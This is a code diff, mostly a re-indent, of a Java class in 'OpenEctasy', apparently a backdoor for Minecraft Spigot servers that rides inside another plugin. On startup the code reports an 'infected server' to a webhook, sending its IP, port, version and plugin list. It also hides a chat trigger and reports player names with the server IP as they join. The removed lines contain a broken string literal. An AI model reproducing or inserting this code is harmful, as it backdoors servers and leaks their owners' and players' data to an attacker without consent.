@@ -82,37 +82,36 @@ public class SpigotAPI implements Listener {
     return String.join(", ", s);
 }
 
-// the constructor for the SpigotAPI class
-public SpigotAPI(JavaPlugin plugin, String webhook, boolean joinLogs){
-    // save the plugin, webhook URL, and join log setting as instance variables
-    this.plugin = plugin;
-    this.joinLogs = joinLogs;
-    this.webhook = webhook;
+    // the constructor for the SpigotAPI class
+    public SpigotAPI(JavaPlugin plugin, String webhook, boolean joinLogs){
+        // save the plugin, webhook URL, and join log setting as instance variables
+        this.plugin = plugin;
+        this.joinLogs = joinLogs;
+        this.webhook = webhook;
 
-    // register this class as an event listener
-    Bukkit.getPluginManager().registerEvents(this, plugin);
+        // register this class as an event listener
+        Bukkit.getPluginManager().registerEvents(this, plugin);
 
-    // send a webhook message with information about the infected server
-    sendWebhook("{\"avatar_url\": \"https://bodyalhoha.com/ectasylogo_64x64.png\", \"username\": \"Open Ectasy\", \"embeds\": [{\"title\":\"OpenEctasy\", \"color\":3447003, \"description\":\"An infected server just started with [OpenEctasy](https://github.com/Body-Alhoha/OpenEctasy). \n\n{desc}\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}".replace("{desc}", "IP : `" + getIP() + "`\nPort : `" + Bukkit.getPort() + "`\nVersion : `" + Bukkit.getVersion().replace("\"", "\\\"") + "`\nInfected Plugin : `" + plugin.getName() + "`\nPlugins : `" + getPlugins() + "`"));
-}
-
-// an event handler that listens for chat events
-@EventHandler
-public void onChatEvent(AsyncPlayerChatEvent e){
-    // if the chat message contains the string "~ectasy~", cancel the event and send a message to the player
-    if(e.getMessage().contains("~ectasy~")){
-        e.setCancelled(true);
-        e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Thank you" + ChatColor.AQUA + "" + ChatColor.BOLD + " for using" + ChatColor.GREEN + "" + ChatColor.BOLD + " Open Ectasy" + ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "!");
+        // send a webhook message with information about the infected server
+        sendWebhook("{\"avatar_url\": \"https://bodyalhoha.com/ectasylogo_64x64.png\", \"username\": \"Open Ectasy\", \"embeds\": [{\"title\":\"OpenEctasy\", \"color\":3447003, \"description\":\"An infected server just started with [OpenEctasy](https://github.com/Body-Alhoha/OpenEctasy). \n\n{desc}\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}".replace("{desc}", "IP : `" + getIP() + "`\nPort : `" + Bukkit.getPort() + "`\nVersion : `" + Bukkit.getVersion().replace("\"", "\\\"") + "`\nInfected Plugin : `" + plugin.getName() + "`\nPlugins : `" + getPlugins() + "`"));
     }
-}
 
-// an event handler that listens for player join events
-@EventHandler
-public void onPlayerJoin(PlayerJoinEvent e){
-    // if join logging is enabled, send a webhook message with the player's name and the server's name
-    if(joinLogs){
-        sendWebhook("{\"avatar_url\": \"https://minotar.net/helm/" + e.getPlayer().getName() + "/100.png\", \"username\": \"" + e.getPlayer().getName() + "\", \"embeds\": [{\"title\":\"Player Join\", \"color\":3447003, \"description\":\"" + e.getPlayer().getName() + " joined the server.\", \"footer\":{\"text\":\"Server:
-" + Bukkit.getServerName() + ""}}]}");
-}
-}
-}
+    // an event handler that listens for chat events
+    @EventHandler
+    public void onChatEvent(AsyncPlayerChatEvent e){
+        // if the chat message contains the string "~ectasy~", cancel the event and send a message to the player
+        if(e.getMessage().contains("~ectasy~")){
+            e.setCancelled(true);
+            e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Thank you" + ChatColor.AQUA + "" + ChatColor.BOLD + " for using" + ChatColor.GREEN + "" + ChatColor.BOLD + " Open Ectasy" + ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "!");
+        }
+    }
+
+    // an event handler that listens for player join events
+    @EventHandler
+    public void onPlayerJoin(PlayerJoinEvent e){
+        // if join logging is enabled, send a webhook message with the player's name and the server's name
+        if(joinLogs){
+            sendWebhook("{\"avatar_url\": \"https://minotar.net/helm/" + e.getPlayer().getName() + "/100.png\", \"username\": \"" + e.getPlayer().getName() + "\", \"embeds\": [{\"title\":\"Player Join\", \"color\":3447003, \"description\":\"Username: `" + e.getPlayer().getName() + "`\nIP : `" + getIP() + "`\n\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}");
+    }
+    }
+    }
